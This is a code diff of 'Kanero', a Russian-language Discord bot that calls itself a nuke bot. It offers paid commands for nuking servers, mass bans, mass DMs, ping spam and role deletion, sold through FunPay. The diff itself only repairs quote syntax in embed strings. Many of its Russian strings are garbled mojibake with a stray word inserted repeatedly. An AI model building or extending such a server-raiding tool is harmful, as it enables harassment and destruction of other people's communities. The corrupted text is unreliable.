@@ -605,7 +605,7 @@ async def nuke(ctx, *, text: str = None):
         return
     if is_guild_blocked(guild.id):
         embed = discord.Embed(description="⛔ Этот сервер заблокирован.", color=0x0a0a0a)
-        embed.set_footer(text="☠️ Kanero)
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
     if nuke_running.get(guild.id):
@@ -632,7 +632,7 @@ async def nuke(ctx, *, text: str = None):
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ Kanero)
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -642,7 +642,7 @@ async def nuke(ctx, *, text: str = None):
             description="❌ Кастомный текст доступен только для **White** пользователей.\nПо вопросам пиши: **davaidkatt**",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ Kanero)
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
     # Кастомный текст с спамом для premium/owner (whitelist игнорирует из списка)
@@ -688,7 +688,7 @@ async def stop(ctx):
             description="❌ Это команда **овнера** и только он может остановить.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ Kanero)
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -698,7 +698,7 @@ async def stop(ctx):
             description="❌ Это команда **Premium** пользователя и обычный whitelist не может остановить.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ Kanero)
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -961,7 +961,7 @@ async def wl_add(ctx, *, user_input: str):
             ),
             color=0xff0000
         )
-        embed.set_footer(text="☠️ Kanero)
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -1114,7 +1114,7 @@ async def pm_add(ctx, *, user_input: str):
             ),
             color=0xff0000
         )
-        embed.set_footer(text="☠️ Kanero)
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -1423,7 +1423,7 @@ class CompensationView(discord.ui.View):
                                 f"**������������:** {duration_text}"
                             ),
                             color=0x00ff00
-                        ).set_footer(text="??Kanero)
+                        ).set_footer(text="🤖 Kanero")
                     )
                 except Exception:
                     pass
@@ -1555,7 +1555,7 @@ async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
                             f"�� ������ ������� навсегда� � {comp_ch.mention}!"
                         ),
                         color=0xff6b6b
-                    ).set_footer(text="??Kanero)
+                    ).set_footer(text="🤖 Kanero")
                 )
             # ������� ������� �подписка истекла������
             try:
@@ -1660,7 +1660,7 @@ async def list_cmd(ctx):
             lines.append(name)
         return "\n".join(lines) if lines else "*пусто*"
 
-    embed = discord.Embed(title="📋 ЛистыKanero, color=0x0a0a0a)
+    embed = discord.Embed(title="📋 Листы Kanero", color=0x0a0a0a)
     protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
     now = datetime.utcnow()
 
@@ -1747,7 +1747,7 @@ async def list_cmd(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ Kanero)
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -2112,7 +2112,7 @@ async def list_clear(ctx):
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="??Kanero)
+    embed.set_footer(text="🤖 Kanero")
     await ctx.send(embed=embed)
 
 
@@ -2128,7 +2128,7 @@ def premium_check():
                 description="� ���� ��� навсегда.\n�� навсегда ���� � ��: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="??Kanero)
+            embed.set_footer(text="🤖 Kanero")
             await ctx.send(embed=embed)
             return False
         if not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
@@ -2137,7 +2137,7 @@ def premium_check():
                 description="��� ������� навсегда ������ **Premium** навсегда�����.\n\n�� навсегда ���� � ��: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="??Kanero)
+            embed.set_footer(text="🤖 Kanero")
             await ctx.send(embed=embed)
             return False
         return True
@@ -2152,7 +2152,7 @@ async def super_nuke(ctx, *, text: str = None):
         return
     if is_guild_blocked(guild.id):
         embed = discord.Embed(description="?? ���� ����все параллельно�.", color=0x0a0a0a)
-        embed.set_footer(text="??Kanero)
+        embed.set_footer(text="🤖 Kanero")
         await ctx.send(embed=embed)
         return
     if nuke_running.get(guild.id):
@@ -2315,7 +2315,7 @@ async def setup(ctx):
             description="❌ Эта команда доступна только **владельцу** бота (OWNER_ID).",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ Kanero)
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
     guild = ctx.guild
@@ -2843,9 +2843,9 @@ async def setup(ctx):
             "**Поддержка:** создай тикет в 🎫・create-ticket\n"
             "**Ссылка:** https://discord.gg/nNTB37QNCG"
         ), color=0x0a0a0a
-    ).set_footer(text="☠️ Kanero))
+    ).set_footer(text="☠️ Kanero"))
 
-    r = discord.Embed(title="📜 Правила вKanero, color=0x0a0a0a)
+    r = discord.Embed(title="📜 Правила в Kanero", color=0x0a0a0a)
     r.add_field(
         name="📜 Основные правила",
         value=(
@@ -2896,7 +2896,7 @@ async def setup(ctx):
 
     # Отправляем сообщение в #info
     info_embed = discord.Embed(
-        title="ℹ️ Информация оKanero,
+        title="ℹ️ Информация о Kanero",
         description=(
             "**🤖 Как добавить бота на свой сервер:**\n"
             "1. Читаем правила (см. выше)\n"
@@ -2946,7 +2946,7 @@ async def setup(ctx):
     info_embed.set_footer(text="☠️ Kanero  |  Нюки-бот для Discord")
     await info_ch.send(embed=info_embed)
 
-    a = discord.Embed(title="🤖 Добавить бота вKanero, color=0x0a0a0a)
+    a = discord.Embed(title="🤖 Добавить бота в Kanero", color=0x0a0a0a)
     a.add_field(name="📁 Freelist (бесплатно)", value="Добавь **бота используя** бота\nПолучишь роль 👥 User:\n`!nuke` • `!auto_nuke` • `!help` • `!changelog`", inline=False)
     a.add_field(name="✅ White", value="`!nuke [канал]` • `!stop` • `!cleanup`\n`!rename` • `!nicks_all` • `!webhooks`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
     a.add_field(name="💎 Premium", value="`!super_nuke` • `!massban` • `!massdm`\n`!spam` • `!pingspam` • `!rolesdelete`\n`!auto_super_nuke` • `!auto_superpr_nuke`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
@@ -2955,7 +2955,7 @@ async def setup(ctx):
 
     # Кнопка с созданием тикета в create-ticket
     ticket_embed = discord.Embed(
-        title="🎫 Поддержка вKanero,
+        title="🎫 Поддержка в Kanero",
         description=(
             "Нужна помощь? Есть вопрос?\n\n"
             "Чтобы создать тикет с нами нажмите следующую кнопку ниже или напиши в личные сообщения.\n\n"
@@ -2974,7 +2974,7 @@ async def setup(ctx):
     await ticket_ch.send(embed=ticket_embed, view=TicketOpenView())
 
     await logs_ch.send(embed=discord.Embed(
-        title="📊 Логи вKanero,
+        title="📊 Логи в Kanero",
         description="`!nukelogs` — логи ролей\n`!list` — whitelist/premium\n`!fl_list` — freelist\n`!auto_info` — статус авто нюков",
         color=0x0a0a0a
     ).set_footer(text="☠️ Kanero  |  Только Owner+"))
@@ -3224,7 +3224,7 @@ async def setup_update(ctx):
                 ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "тикет" in c.name.lower(), guild.text_channels)
                 addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)
                 info_embed = discord.Embed(
-                    title="ℹ️ Информация оKanero,
+                    title="ℹ️ Информация о Kanero",
                     description=(
                         "**🤖 Как добавить бота на свой сервер:**\n"
                         "1. Читаем правила (см. выше)\n"
@@ -3296,7 +3296,7 @@ async def setup_update(ctx):
                     
                     # Создаём обновлённый embed с актуальными каналами
                     info_embed = discord.Embed(
-                        title="ℹ️ Информация оKanero,
+                        title="ℹ️ Информация о Kanero",
                         description=(
                             "**🤖 Как добавить бота на свой сервер:**\n"
                             "1. Читаем правила (см. выше)\n"
@@ -3390,7 +3390,7 @@ async def setup_update(ctx):
             
             # Создаём обновлённый embed
             ticket_embed = discord.Embed(
-                title="🎫 Поддержка вKanero,
+                title="🎫 Поддержка в Kanero",
                 description=(
                     "Нужна помощь? Есть вопрос?\n\n"
                     "Чтобы создать тикет с нами нажмите следующую кнопку ниже или напиши в личные сообщения.\n\n"
@@ -3630,7 +3630,7 @@ async def fl_add(ctx, *, user_input: str):
             ),
             color=0xff0000
         )
-        embed.set_footer(text="☠️ Kanero)
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -3777,7 +3777,7 @@ async def fl_clear(ctx):
         description=f"������� **{count}** навсегда�����.",
         color=0x0a0a0a
     )
-    embed.set_footer(text="??Kanero)
+    embed.set_footer(text="🤖 Kanero")
     await ctx.send(embed=embed)
 
 
@@ -3972,7 +3972,7 @@ async def ticket_setup(ctx):
     if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
         return
     embed = discord.Embed(
-        title="🎫 Поддержка вKanero,
+        title="🎫 Поддержка в Kanero",
         description=(
             "Нужна помощь? Есть вопрос?\n\n"
             "Чтобы создать тикет с нами нажмите следующую кнопку ниже или напиши в личные сообщения.\n\n"
@@ -4057,7 +4057,7 @@ async def massdm(ctx, *, text: str):
         description=f"? навсегда��: **{sent}**\n? �� навсегда��: **{failed}**",
         color=0x0a0a0a
     )
-    embed.set_footer(text="??Kanero)
+    embed.set_footer(text="🤖 Kanero")
     await status_msg.edit(embed=embed)
 
 
@@ -4082,7 +4082,7 @@ async def massban(ctx):
         description=f"? навсегда: **{banned}**",
         color=0x0a0a0a
     )
-    embed.set_footer(text="??Kanero)
+    embed.set_footer(text="🤖 Kanero")
     await status_msg.edit(embed=embed)
 
 
@@ -4130,7 +4130,7 @@ async def rolesdelete(ctx):
         description=f"??? ������� �����: **{deleted}**",
         color=0x0a0a0a
     )
-    embed.set_footer(text="??Kanero)
+    embed.set_footer(text="🤖 Kanero")
     await ctx.send(embed=embed)
 
 
@@ -4152,7 +4152,7 @@ async def serverinfo(ctx):
     embed.add_field(name="?? ������", value=guild.created_at.strftime("%d.%m.%Y"))
     if guild.icon:
         embed.set_thumbnail(url=guild.icon.url)
-    embed.set_footer(text="??Kanero)
+    embed.set_footer(text="🤖 Kanero")
     await ctx.send(embed=embed)
 
 
@@ -4180,7 +4180,7 @@ async def userinfo(ctx, user_id: int = None):
         embed.add_field(name="?? ����", value="��" if member.premium_since else "���")
     if user.avatar:
         embed.set_thumbnail(url=user.avatar.url)
-    embed.set_footer(text="??Kanero)
+    embed.set_footer(text="🤖 Kanero")
     await ctx.send(embed=embed)
 
 
@@ -4489,7 +4489,7 @@ async def giverole(ctx, user: discord.Member, role: discord.Role):
             description=f"? ���� **{role.name}** ������ **{user}**.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="??Kanero)
+        embed.set_footer(text="🤖 Kanero")
         await ctx.send(embed=embed)
     except discord.Forbidden:
         await ctx.send("? ��� ���� ������ ��� ���� (���� ���� ���� � навсегда).")
@@ -5252,7 +5252,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                     description=f"������������: **{user}** (`{uid}`)\n? навсегда �� **{unbanned}** навсегда\n? �� ������� �� **{failed}** навсегда",
                     color=0x0a0a0a
                 )
-                embed.set_footer(text="??Kanero)
+                embed.set_footer(text="🤖 Kanero")
                 await message.channel.send(embed=embed)
             except ValueError:
                 await message.channel.send("�������������: `!unban <user_id>`")
@@ -5376,7 +5376,7 @@ async def on_message(message):
                 await message.channel.send("? ��� �Готово.")
                 return
             embed = discord.Embed(
-                title="?? OWNER PANEL �Kanero,
+                title="👑 OWNER PANEL Kanero",
                 description=(
                     "```\n"
                     " ------�----�---------�---�----�-------�------�-\n"
@@ -5738,7 +5738,7 @@ async def on_message(message):
                 embed=discord.Embed(
                     description="?? ������� �� ����� ������� �� навсегда.\n������ ���� �� ���� ������ � навсегда� ���.",
                     color=0x0a0a0a
-                ).set_footer(text="??Kanero)
+                ).set_footer(text="🤖 Kanero")
             )
         except Exception:
             pass
@@ -5902,7 +5902,7 @@ async def on_command_error(ctx, error):
             ),
             color=0xff0000
         )
-        embed.set_footer(text="??Kanero)
+        embed.set_footer(text="🤖 Kanero")
         await ctx.send(embed=embed)
         return
 
@@ -5956,6 +5956,8 @@ async def on_command_error(ctx, error):
 
 
 bot.run(config.TOKEN)
+
+
 
 
 
